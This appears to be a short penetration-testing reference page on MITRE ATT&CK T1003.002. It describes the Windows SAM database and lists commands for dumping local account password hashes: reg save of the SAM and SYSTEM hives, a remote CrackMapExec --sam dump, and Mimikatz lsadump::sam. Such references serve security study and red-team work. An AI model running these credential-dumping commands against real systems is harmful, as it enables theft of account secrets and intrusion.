---
description: MITRE ATT&CK, Credential Access, Sub-technique T1003.002
---

# Security Account Manager (SAM)

The Security Accounts Manager (SAM) is a database file in Windows that contains usernames and passwords for local accounts, typically those identified from the `net user` command.

The SAM is a database file that contains local accounts for the host, typically those found with the `net user` command.

### Dumping the SAM

```bash
# Manually extracting the SAM
reg save HKLM\sam sam
reg save HKLM\system system

# Dumping the SAM remotely with CrackMapExec
crackmapexec smb $ip -u $username -p $password --sam

# Dumping the SAM with Mimikatz
mimikatz lsadump::sam
```
